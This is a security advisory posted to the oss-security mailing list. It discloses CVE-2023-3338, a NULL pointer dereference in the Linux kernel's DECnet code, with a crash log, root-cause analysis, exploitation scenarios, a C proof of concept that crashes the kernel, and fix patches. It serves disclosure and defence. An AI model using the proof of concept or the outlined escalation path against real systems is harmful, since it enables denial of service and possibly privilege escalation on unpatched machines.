Received: (qmail 28477 invoked by uid 550); 24 Jun 2023 16:24:00 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19719 invoked from network); 24 Jun 2023 16:11:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=betrusted.it; s=mail;
	t=1687623097; bh=uheHTf4firohuXazRbTzYfMKv8TlhPIllvxtdRIeg7s=;
	h=From:To:Subject:Date;
	b=piDFx6fegH1ZVDR4BhogpJo57CEWXtZvxDfFfoSVLrpuY11ZK/0BQSKcgoL4tVIYL
	 BXnwtpR9FBw3Pu6j9hJJSKYlNibEtQHM6yPNCy1LgIcLmulbhecuJVdUNToN3VaWRf
	 tAjmcnB5k3FEkGGgF4RnsRpLYP31xAvNW5eJrkIhXmh8ROS8FKfrP5AAZ51HoKCpjY
	 CKXt0z4qQWxLLm6Ahsgtp28tOknVuWl5Kqm93xDf7cBM49H7s0Xlz0qgj0CLHtP4/m
	 HwuVUnUKpEU9pFYL2i5H9IoiE1B8NmrNwB9KKxYkr336OGx1alb0uRACWSoxGptpKA
	 7zWZsQgtybtbg==
From: Ornaghi Davide - Betrusted <davide.ornaghi@betrusted.it>
To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
Thread-Topic: CVE-2023-3338: Linux Kernel NULL Pointer Dereference in DECnet
Thread-Index: AQHZprVJVPR38JYSMU67sNHYy+/N1Q==
Date: Sat, 24 Jun 2023 16:11:36 +0000
Message-ID: <92b180310a434c8bbca9b2449180d85d@betrusted.it>
Accept-Language: it-IT, en-US
Content-Language: it-IT
X-MS-Has-Attach:
X-MS-TNEF-Correlator:
x-originating-ip: [192.168.140.1]
x-c2processedorg: 3c642b5e-0ab0-4568-9f09-fc6a11a1a8a0
Content-Type: multipart/alternative;
	boundary="_000_92b180310a434c8bbca9b2449180d85dbetrustedit_"
MIME-Version: 1.0
Subject: [oss-security] CVE-2023-3338: Linux Kernel NULL Pointer Dereference in DECnet

--_000_92b180310a434c8bbca9b2449180d85dbetrustedit_
Content-Type: text/plain; charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

Hi all,



I'm reporting a Null Pointer Dereference vulnerability that I found while a=
ttempting to ping localhost by sending a Hello message to a local DECnet so=
cket:



```
[45620.986136] BUG: kernel NULL pointer dereference, address: 0000000000000=
000
[45620.986141] #PF: supervisor read access in kernel mode
[45620.986143] #PF: error_code(0x0000) - not-present page
[45620.986146] PGD 0 P4D 0
[45620.986148] Oops: 0000 [#1] PREEMPT SMP NOPTI
[45620.986152] CPU: 6 PID: 37997 Comm: test Tainted: G        W    L    5.1=
9.0-43-generic #44~22.04.1-Ubuntu
[45620.986155] Hardware name: VMware, Inc. VMware Virtual Platform/440BX De=
sktop Reference Platform, BIOS 6.00 11/12/2020
[45620.986156] RIP: 0010:dn_nsp_send+0x1c9/0x200 [decnet]
[45620.986159] Code: 74 3e 8d 48 01 f0 0f b1 4a 40 41 0f 94 c6 45 84 f6 74 =
eb 48 89 d3 49 89 d7 48 83 e3 fe 48 89 55 90 e8 eb f7 ac c0 48 8b 55 90 <48=
> 8b 02 48 8b 80 e8 00 00 00 49 89 85 e8 01 00 00 e9 93 fe ff ff
[45620.986161] RSP: 0018:ffffc90032abfc90 EFLAGS: 00010246
[45620.986164] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00000000000=
00000
[45620.986165] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 00000000000=
00000
[45620.986166] RBP: ffffc90032abfd00 R08: 0000000000000000 R09: 00000000000=
00000
[45620.986167] R10: 0000000000000000 R11: 0000000000000000 R12: ffff8881aca=
6f9c0
[45620.986168] R13: ffff888118903cc0 R14: 0000000000000000 R15: 00000000000=
00000
[45620.986172] FS:  00007f144e58b740(0000) GS:ffff888339d80000(0000) knlGS:=
0000000000000000
[45620.986173] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[45620.986175] CR2: 0000000000000000 CR3: 0000000226154004 CR4: 00000000007=
70ee0
[45620.986185] PKRU: 55555554
[45620.986186] Call Trace:
[45620.986189]  <TASK>
[45620.986191]  dn_nsp_send_conninit+0x207/0x4c0 [decnet]
[45620.986196]  __dn_connect+0x172/0x230 [decnet]
[45620.986220]  dn_connect+0x5c/0xa0 [decnet]
[45620.986223]  __sys_connect_file+0x68/0x80
[45620.986225]  __sys_connect+0xb6/0xe0
[45620.986227]  ? exit_to_user_mode_loop+0xf1/0x140
[45620.986228]  ? exit_to_user_mode_prepare+0x3b/0xd0
[45620.986230]  ? syscall_exit_to_user_mode+0x2a/0x50
[45620.986232]  ? do_syscall_64+0x69/0x90
[45620.986234]  __x64_sys_connect+0x18/0x30
[45620.986236]  do_syscall_64+0x59/0x90
[45620.986237]  ? exit_to_user_mode_prepare+0x3b/0xd0
[45620.986241]  ? syscall_exit_to_user_mode+0x2a/0x50
[45620.986242]  ? do_syscall_64+0x69/0x90
[45620.986244]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
```

## Bug details

This crash is due to the dn_nsp_send function (net/decnet/dn_nsp_out.c) whi=
ch, first off, causes a Denial of Service by preventing the release of lock=
s such as the current sock's sk->sk_lock, but could also lead to Local Priv=
ilege Escalation under certain conditions.

When first starting a connection with a DECnet socket, the connect() handle=
r __dn_connect, while building a route, ends up calling dst_alloc (net/decn=
et/dn_route.c:1178) which initializes the dst reference counter to 0 instea=
d of 1 (see commit 76371d2e3ad1f84426a30ebcd8c3b9b98f4c724f for an explanat=
ion).
Later on, dn_insert_route is expected to increase the dst refcount, but in =
reality, it fails to do so, since dst_hold_and_use (net/decnet/dn_route.c:3=
47) actually calls atomic_inc_not_zero on dst->__refcnt, which only works i=
f the refcount is not 0. While the refcount hasn't changed, the dst->_use c=
ounter is correctly incremented by dst_use_noref.

```c
static inline void dst_hold(struct dst_entry *dst)
{
    BUILD_BUG_ON(offsetof(struct dst_entry, __refcnt) & 63);
    WARN_ON(atomic_inc_not_zero(&dst->__refcnt) =3D=3D 0);            <=3D=
=3D=3D
}
```

Therefore, a warning gets thrown.
As a consequence, all the following sk_dst_get(sk) calls will return NULL s=
ince this function also uses atomic_inc_not_zero, and returns NULL on failu=
re.
This condition leads to a NPD at net/decnet/dn_nsp_out.c:92:

```c
if (dn_route_output_sock(&sk->sk_dst_cache, &fld, sk, 0) =3D=3D 0) {
    dst =3D sk_dst_get(sk);
    sk->sk_route_caps =3D dst->dev->features;                        <=3D=
=3D=3D   dst is NULL
    goto try_again;
}
```

## Exploitation scenarios

Furthermore, the try_again label redirects the execution to the following c=
ode:

```c
if (dst) {
    try_again:
    skb_dst_set(skb, dst);
    dst_output(&init_net, skb->sk, skb);        <=3D=3D=3D
    return;
}
```

where the dst->output() function is invoked by dst_output to send the outgo=
ing packet after the routing decision. In an attacker's ideal conditions, w=
here the zero page is mappable, this allows arbitrary code execution.

In more modern systems, the previous scenario can be triggered multiple tim=
es to possibly control other reference counters and thus trigger further vu=
lnerabilities such as UAF.
For instance, one could force the sock->file (from __sys_sendto) refcount t=
o wrap around and eventually free it, though a definitive exploitation tech=
nique is still under study.

## Vulnerable versions

Linux kernels with DECnet support from Linux-4.12-rc7 (commit 76371d2e3ad1f=
84426a30ebcd8c3b9b98f4c724f) up to Linux-6.0.19.
The said subsystem has been removed during the 6.1 merge window because dep=
recated.

## Proof-of-Concept

The kernel has to be compiled with CONFIG_DECNET=3Dy and should have a DECn=
et address assigned (echo -n "1.10" > /proc/sys/net/decnet/node_address):

```c
int main() {
    int sockfd;

    if ((sockfd =3D socket(AF_DECnet, SOCK_SEQPACKET, DNPROTO_NSP)) =3D=3D =
-1) {
        perror("socket");
        exit(-1);
    }
    struct sockaddr_dn sockaddr;
    struct nodeent dp;
    static struct dn_naddr addr;
    char *nodename =3D "turtle";
    addr.a_addr[0] =3D 10 & 0xFF;
    addr.a_addr[1] =3D (1 << 2) | ((10 & 0x300) >> 8);
    sockaddr.sdn_family =3D AF_DECnet;
    sockaddr.sdn_flags  =3D 0x00;
    sockaddr.sdn_objnum  =3D DNOBJECT_MIRROR;
    sockaddr.sdn_objnamel  =3D 0x00;

    dp.n_addr =3D (unsigned char *)&addr.a_addr;
    dp.n_length =3D 2;
    dp.n_name =3D nodename;
    dp.n_addrtype =3D AF_DECnet;

    if (connect(sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0=
) {
        perror("socket");
        exit(-1);
    }
    return 0;
}
```

Writing a PoC that returns a root shell on devices without SMAP and vm.mmap=
_min_addr is also trivial.

## Bug fix

This was my suggested patch:

```diff
--- a/net/decnet/dn_route.c     2023-06-06 15:55:36.615147110 +0200
+++ b/net/decnet/dn_route.c     2023-06-06 15:56:00.179416949 +0200
@@ -1175,7 +1175,7 @@ make_route:
        if (dev_out->flags & IFF_LOOPBACK)
                flags |=3D RTCF_LOCAL;

-       rt =3D dst_alloc(&dn_dst_ops, dev_out, 0, DST_OBSOLETE_NONE, 0);
+       rt =3D dst_alloc(&dn_dst_ops, dev_out, 1, DST_OBSOLETE_NONE, 0);
        if (rt =3D=3D NULL)
                goto e_nobufs;
```

Also, always make sure that dst isn't NULL after sk_dst_get:

```diff
--- a/net/decnet/dn_nsp_out.c   2023-06-06 22:01:57.212802584 +0200
+++ b/net/decnet/dn_nsp_out.c   2023-06-06 22:04:37.138709847 +0200
@@ -89,7 +89,9 @@ try_again:
        fld.flowidn_proto =3D DNPROTO_NSP;
        if (dn_route_output_sock(&sk->sk_dst_cache, &fld, sk, 0) =3D=3D 0) {
                dst =3D sk_dst_get(sk);
-               sk->sk_route_caps =3D dst->dev->features;
+               if (!dst)
+                       return;
+               sk->sk_route_caps =3D dst->dev->features;
                goto try_again;
        }
```

The DECnet subsystem has been officially removed from all longterm and stab=
le kernel series, starting from 4.14.319, 4.19.287, 5.4.248, 5.10.185 and 5=
.15.118.

Best regards,

Davide Ornaghi

--_000_92b180310a434c8bbca9b2449180d85dbetrustedit_--
